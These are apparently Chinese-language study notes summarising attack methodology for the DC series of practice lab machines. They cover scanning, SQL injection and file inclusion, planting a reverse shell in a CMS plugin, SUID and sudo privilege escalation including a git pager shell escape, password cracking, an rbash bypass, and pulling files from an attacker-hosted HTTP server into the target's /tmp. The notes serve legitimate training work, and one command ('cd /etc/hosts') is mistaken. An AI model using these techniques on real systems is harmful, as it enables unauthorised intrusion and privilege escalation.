# DC系列靶机总结

## (一) 信息收集

- 扫描局域网内靶机地址:

```
sudo arp-scan -l
```

- 扫描靶机开放的端口以及详细的信息:

```
nmap -A -sV xxx_ip (查CMS种类)
```

- 扫描web目录(,寻找登录后台, 寻找可疑文件):

```
dirb  //一般
dirbuster  //可以使用dirb的字典
dirsearch  //较好
goburster
```

- 眼光不应该局限于页面的主要内容,可以使用Google去查询靶机web或其他有关于靶机的内容



## (二) 漏洞搜寻

- 首先进入靶机HTTP服务(如果有的话), 尝试sql注入, 密码暴力破解(八成不行)

- 从搜寻的CMS(如果能发现)寻找CMS的漏洞 //Google是个好帮手
- 使用相应的CMS扫描工具对靶机IP继续进行扫描,查找用户以及相关的信息
- 从网站中看看有没有什么可以提交的页面,发掘是否有文件包含漏洞
- 如果进入CMS管理系统,查看是否可以使用或下载PHP插件,在PHP页面中插入反弹shell, 或者寻找里面插件的漏洞

- 在网站中发送信息,如果可疑,用brupsuite拦截,并修改发送的值, 尝试sql注入以及文件包含

- 文件包含漏洞查询时可以使用模糊测试工具wfuzz, 查看输入的命令被包含在哪个文件中

- 使用searchsploit查询漏洞文件

````
searchsploit XXX   //搜索漏洞  
searchsploit -m exp_name  //查询漏洞所在地址
````



 

## (三) 权限提升

- 使用msf或者nc等工具登录靶机控制界面可能没有交互式shell这时需要:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

- 查看是否能进行suid提权

```
find / -user root -perm -4000 -print 2>/dev/null
```

- 查看当前用户是否具有某些root用户权限:
- 向文件中添加内容直接获得root权限,
- 使用 sudo  xxx 执行命令`(别忘记前面加sudo)`

```
sudo -l
```

- 查看里面有没有什么特殊的文件, 使用漏洞搜寻查找是否具有漏洞,是否可以据此提权
- git提权(sudo -l发现)

```
sudo git -p help config
# 末行模式下书写
!/bin/sh
```



## (四) 密码破解

- 在得知CMS类型的时候就可以使用相关的工具进行密码破解,比如wp-scan
- 使用hydra进行破解(一般破解ssh密码时使用这个
- cewl 抓取网站信息来充当密码
- john破解哈希值

## (五) 杂记

- rbash绕过(vi方法)

```
//选择一个文件,使用vi打开
//末行模式下:
(1)  :set shell=/bin/bash
(2)  :shell
```

- 配置hosts文件,有时DNS无法解析靶机地址,这时我们就需要自己在攻击机器上添加靶机的IP以及主机名

```
cd /etc/hosts
```

- 靶机之间的文件传输

```
// 使用python在攻击机器上开启http服务,在靶机上wget下载.注意攻击机器http服务的开启要在传送的文件同一目录下,靶机的下载要在/tmp文件夹或其他具有弱权限的文件夹下下载

//攻击机器 python2
python -m SimpleHTTPServer xxx_port
//攻击机器 python3
python -m http.server xxx_port

//靶机
wget http://xxxx_ip:xx_port/xxx_file
```

- 注意查看靶机里面邮件内容可能有惊喜